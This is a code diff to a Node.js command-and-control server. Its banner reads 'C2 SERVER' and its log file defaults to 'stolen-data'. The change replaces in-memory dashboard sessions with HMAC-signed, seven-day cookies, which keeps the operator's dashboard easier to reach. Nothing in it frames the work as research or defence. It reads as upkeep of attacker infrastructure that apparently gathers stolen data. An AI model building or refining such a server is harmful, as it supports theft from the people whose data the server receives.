@@ -26,9 +26,10 @@ const LOG           = path.join(__dirname, process.env.LOG_FILE || 'stolen-data.
 const MAX_BODY      = parseInt(process.env.MAX_BODY_BYTES, 10) || 1048576;
 const POLL_INTERVAL = parseInt(process.env.POLL_INTERVAL_MS, 10) || 600;
 
-const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
+const COOKIE_SECRET = process.env.COOKIE_SECRET || DASH_PASS + '_c2sig';
+const COOKIE_MAX_AGE = 60 * 60 * 24 * 7; // 7 days
 
-const sessions = new Set();
+const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
 
 console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
 console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
@@ -52,8 +53,26 @@ function parseCookies(req) {
   return obj;
 }
 
+function signToken(payload) {
+  const data = Buffer.from(JSON.stringify(payload)).toString('base64url');
+  const sig = crypto.createHmac('sha256', COOKIE_SECRET).update(data).digest('base64url');
+  return data + '.' + sig;
+}
+
+function verifyToken(token) {
+  if (!token || !token.includes('.')) return null;
+  const [data, sig] = token.split('.');
+  const expected = crypto.createHmac('sha256', COOKIE_SECRET).update(data).digest('base64url');
+  if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) return null;
+  try {
+    const payload = JSON.parse(Buffer.from(data, 'base64url').toString());
+    if (payload.exp && Date.now() / 1000 > payload.exp) return null;
+    return payload;
+  } catch { return null; }
+}
+
 function isAuthed(req) {
-  return sessions.has(parseCookies(req).c2sess || '');
+  return verifyToken(parseCookies(req).c2sess) !== null;
 }
 
 function readBody(req) {
@@ -135,9 +154,11 @@ const server = http.createServer(async (req, res) => {
     const body = await readBody(req);
     const params = new URLSearchParams(body);
     if (params.get('password') === DASH_PASS) {
-      const token = crypto.randomBytes(24).toString('hex');
-      sessions.add(token);
-      res.writeHead(302, { 'Set-Cookie': `c2sess=${token}; Path=/; HttpOnly; SameSite=Strict`, 'Location': '/' }).end();
+      const token = signToken({ iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + COOKIE_MAX_AGE });
+      res.writeHead(302, {
+        'Set-Cookie': `c2sess=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${COOKIE_MAX_AGE}`,
+        'Location': '/',
+      }).end();
     } else {
       res.writeHead(302, { 'Location': '/?err=1' }).end();
     }
